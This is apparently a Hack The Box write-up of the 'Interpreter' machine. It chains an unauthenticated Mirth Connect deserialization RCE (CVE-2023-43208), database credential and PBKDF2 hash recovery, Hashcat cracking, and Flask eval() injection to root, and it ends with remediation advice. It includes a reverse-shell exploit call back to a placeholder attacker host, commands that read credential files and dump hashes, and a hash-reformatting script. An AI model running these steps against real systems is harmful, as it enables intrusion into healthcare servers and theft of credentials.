---
title: "Interpreter — Mirth Connect Unauthenticated RCE and Flask eval() Privilege Escalation"
seoTitle: "Interpreter — Mirth Connect RCE and Flask eval() Privilege Escalation"
description: "Mirth Connect XStream deserialization (CVE-2023-43208) provides an unauthenticated shell; database credentials and a PBKDF2 hash give SSH access, then a double eval() in a root-owned Flask service yields root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - deserialization
  - code-injection
  - healthcare
  - web
objective: "Escalate from an unauthenticated Mirth Connect RCE to full root compromise by chaining XStream deserialization, database credential recovery, and Python eval() injection in a root-owned service."
tools:
  - rustscan
  - nmap
  - curl
  - mysql
  - hashcat
  - python3
  - netcat
  - wget
  - ssh
skill: "Exploiting an unauthenticated Java deserialization RCE and escalating through database credential recovery and Python eval() injection"
outcome: "Unauthenticated command execution as the Mirth Connect service account, SSH access as the recovered user, and root execution via eval() injection in a root-owned Flask service"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Medium |
| Target environment | Linux server running NextGen Mirth Connect 4.4.0 (healthcare integration engine) |
| Starting position | Unauthenticated network access |
| Objective | Chain an unauthenticated Mirth Connect RCE, database credential recovery, and Python eval() injection to reach root |
| Outcome | Service-account shell, recovered user credential with SSH access, and root execution in a root-owned Flask service |

## Mirth Connect deserialization to Flask eval root

Interpreter is a Medium Hack The Box Linux machine built around a vulnerable healthcare integration platform, NextGen Mirth Connect 4.4.0. An unauthenticated XStream deserialization flaw (CVE-2023-43208) in the REST API yields a shell as the `<INTEGRATION_SERVICE_ACCOUNT>` service account. The application configuration exposes database credentials; the MariaDB database stores a PBKDF2-HMAC-SHA256 hash for `<LAB_USER>`, which I reformatted for Hashcat mode 10900, cracked, and used to authenticate over SSH. A root-owned Flask service (`notif.py`) on port 54321 renders XML patient records through a double `eval()` pattern, and a regex filter restricting spaces and special characters is bypassed to gain root. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Mirth Connect 4.4.0 → CVE-2023-43208 XStream deserialization → service-account shell → `mirth.properties` database credentials → MariaDB PBKDF2 hash → Hashcat crack → SSH as `<LAB_USER>` → root-owned Flask `eval()` injection → root**

## Linux Mirth Connect 4.4.0, unauthenticated, chain to root

- **Target:** a Linux server running Mirth Connect 4.4.0, a healthcare integration engine that processes HL7 messages.
- **Exposed services:** SSH (22), HTTP (80, nginx redirect), and HTTPS (443, Jetty: Mirth Connect).
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** move from an unauthenticated foothold to full root compromise by chaining an application-layer RCE with a privilege-escalation flaw in a second service.
- **Constraints:** all activity stayed inside the Hack The Box lab environment.

## Evidence: XStream deserialization to PBKDF2 crack to eval injection

### 1. Service Enumeration and Version Fingerprinting

Observation: a port scan exposes SSH, an HTTP redirect, and an HTTPS service, and the Mirth Connect API discloses an exact version.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/Interpreter-TCP
```

Truncated scan output:

```text
22/tcp:  SSH
80/tcp:  HTTP (nginx → HTTPS redirect)
443/tcp: HTTPS (Jetty — Mirth Connect)
```

```bash
curl -k -H 'X-Requested-With: OpenAPI' \
  https://<TARGET_IP>/api/server/version
# {"version":"4.4.0"}
```

Significance: the version endpoint answers without authentication, so the exact Mirth Connect release is known before any exploit attempt: 4.4.0 is the version affected by CVE-2023-43208.

Result: the application fingerprint confirms Mirth Connect 4.4.0 exposed over HTTPS.

### 2. Mirth Connect Unauthenticated RCE (CVE-2023-43208)

Observation: Mirth Connect deserializes XML payloads received by its REST API using the XStream library. In 4.4.0, servlets such as `UserServlet` and `SystemServlet` disable authentication checks while processing a request, so an XML payload carrying an XStream gadget chain can instantiate classes whose deserialization invokes `Runtime.exec()`.

Action: a listener receives the callback, and the exploit payload is configured to return the shell to it (endpoint, callback address, and listener port are placeholders):

```bash
nc -lvnp <LISTEN_PORT>
```

```bash
python3 poc.py \
  -u 'https://<TARGET_IP>' \
  -lh '<ATTACKER_IP>' \
  -lp '<LISTEN_PORT>'
```

The payload returns a shell in the service account's context:

```text
<INTEGRATION_SERVICE_ACCOUNT>@<TARGET_HOST>:/usr/local/mirthconnect$
```

Significance: authentication is not required, so the deserialization flaw converts an unauthenticated HTTP request into OS command execution under the account that runs Mirth Connect.

Result: an unauthenticated shell is obtained as `<INTEGRATION_SERVICE_ACCOUNT>`.

### 3. Credential Harvesting from Configuration and Database

Observation: the service account can read the Mirth Connect configuration file, which stores database credentials alongside the connection string.

```bash
cat /usr/local/mirthconnect/conf/mirth.properties
```

```ini
database.url      = jdbc:mariadb://localhost:3306/mc_bdd_prod
database.username = mirthdb
database.password = <MIRTH_DB_PASSWORD>
```

The database holds a password hash rather than a plaintext password:

```sql
mysql -u mirthdb -p<MIRTH_DB_PASSWORD> mc_bdd_prod
SELECT p.USERNAME, pp.PASSWORD
FROM PERSON p JOIN PERSON_PASSWORD pp ON p.ID = pp.PERSON_ID;
-- <LAB_USER> | <PBKDF2_HASH_BASE64>
```

Significance: file permissions on the configuration expose a reusable database credential, and the application database stores account credentials as a PBKDF2-HMAC-SHA256 hash, so the objective shifts from exploitation to offline cracking.

Result: a database credential and an account password hash for `<LAB_USER>` are recovered.

### 4. PBKDF2 Hash Cracking and SSH Access

Observation: the stored value is Base64-encoded; I reconstructed the 40 bytes from it: an 8-byte salt followed by a 32-byte derived key, with an iteration count of 600,000. Cracking requires reformatting it into the delimited form Hashcat mode 10900 expects.

```python
import base64
data     = base64.b64decode('<PBKDF2_HASH_BASE64>')
salt_b64 = base64.b64encode(data[:8]).decode()
dk_b64   = base64.b64encode(data[8:]).decode()
print(f'sha256:600000:{salt_b64}:{dk_b64}')
# sha256:600000:<SALT_BASE64>:<DK_BASE64>
```

```bash
hashcat -m 10900 interpreter.hash /usr/share/wordlists/rockyou.txt
# sha256:600000:...:...:<CRACKED_PASSWORD>
```

I used the recovered password for SSH:

```bash
ssh <LAB_USER>@<TARGET_IP>
```

Significance: the split layout of the stored hash determines the cracker parameters, and the cracked value is a reusable account password rather than a service-specific secret.

Result: an authenticated SSH session as `<LAB_USER>` is reported after using the cracked password.

### 5. Privilege Escalation via Flask eval() Injection

Observation: a root-owned Flask service, `notif.py`, listens on port 54321 and accepts XML patient records. Its rendering routine interpolates user-controlled fields into an f-string and then passes the result to `eval()`:

```python
template = f"Patient {first} {last} ({gender}), " \
           f"{{datetime.now().year - year_of_birth}} years old, " \
           f"received from {sender} at {ts}"
try:
    return eval(f"f'''{template}'''")
except Exception as e:
    return f"[EVAL_ERROR] {e}"
```

I checked the process listing and confirmed the service runs as root before the injection:

```bash
ps aux | grep root
# root ... python3 /usr/local/bin/notif.py
```

Action: any `{}` expression reaching a field such as `sender_app` is captured by the outer f-string and then executed when `eval()` runs on the result. A regex filter (`r"^[a-zA-Z0-9._'\"(){}=+/]+$"`) blocks spaces, commas, and brackets, so the injected expression is expressed without them. The representative request substitutes a placeholder for the injected expression:

```bash
wget --method=POST \
  --header="Content-Type: application/xml" \
  --body-data="<patient>
<sender_app>{&lt;EVAL_EXPRESSION&gt;}</sender_app>
...
</patient>" \
  http://127.0.0.1:54321/addPatient
```

The returned context confirms execution:

```text
root@<TARGET_HOST>:~#
```

Significance: the first f-string interpolation happens before `eval()` processes the template, which creates a two-stage injection surface; because the service runs as root, the injected expression executes with full privileges. Permitting parentheses, quotes, dots, and slashes is enough to express method calls and imports without the blocked characters.

Result: the returned prompt confirms root-level command execution.

## Obstacles: unconverted hash layout and regex filter

| Challenge | Decision | Rationale |
|---|---|---|
| The stored hash is not in a ready-to-crack format | Decode the 40-byte value and re-encode the salt and derived key as `sha256:600000:<salt>:<dk>` | Matches the delimited input Hashcat mode 10900 expects |
| Regex filter blocks spaces, commas, and brackets | Encode the command and reach modules without the blocked characters | The filter still permits the parentheses, quotes, dots, and slashes needed to build the expression |

## Outcome: root execution via eval() in a root Flask service

The documented results show unauthenticated command execution as the Mirth Connect service account, recovery of a user credential from the application database, and root command execution through `eval()` injection in a root-owned Flask service. The credential recovered from the database is reused to authenticate over SSH as `<LAB_USER>`, the intermediate user-level foothold.

## Recommendations: deserialization patch, exposed config, root service, eval() use

The case documents the weaknesses and their effects. It does not document testing of the proposed controls.

1. **Unauthenticated deserialization in Mirth Connect.** CVE-2023-43208 lets an unauthenticated request reach XStream deserialization and execute commands as the service account. *Recommendation:* upgrade Mirth Connect to at least 4.4.1, where XStream uses an allowlist instead of a denylist, and keep the service off the public internet behind a VPN or reverse proxy where patching is delayed. *Detection:* correlate unexpected POST bodies to Mirth Connect servlet paths with command execution by the service account.
2. **Credentials readable by the service account.** The Mirth Connect configuration stores the database password in plaintext, and that database stores account password hashes. *Recommendation:* restrict access to `mirth.properties`, move secrets to a dedicated secrets store, and rotate any credential a compromise of the service account would expose. *Detection:* monitor reads of configuration files by the service account.
3. **Root-owned application service.** `notif.py` runs as root, so a flaw in its request handling becomes a direct privilege escalation. *Recommendation:* run the service under a dedicated unprivileged account using systemd `User=` and `Group=` directives. *Detection:* flag any network-facing service that runs as root.
4. **`eval()` on request data.** The double `eval()` pattern turns a user-controlled field into code execution. *Recommendation:* replace `eval()` with explicit templating that does not execute code, and treat regex input filters as a usability check rather than a security boundary. *Detection:* review code paths that pass request data to `eval()`, `exec()`, or dynamic template rendering.

## References

- [Hack The Box — Interpreter](https://app.hackthebox.com/machines/Interpreter) (retired machine)
- [NVD — CVE-2023-43208](https://nvd.nist.gov/vuln/detail/CVE-2023-43208)
- [NextGen — Mirth Connect 4.4.1 What's New (vendor security fix)](https://github.com/nextgenhealthcare/connect/wiki/4.4.1---What's-New)
- [RustScan](https://github.com/RustScan/RustScan) (fast port scanner)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [curl manual page](https://curl.se/docs/manpage.html)
- [Hashcat — Example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [MariaDB command-line client](https://mariadb.com/kb/en/mariadb-command-line-client/)
- [Python — `eval` built-in function](https://docs.python.org/3/library/functions.html#eval)
- [systemd.exec — `User=`, `Group=`](https://www.freedesktop.org/software/systemd/man/latest/systemd.exec.html) (service hardening directives)
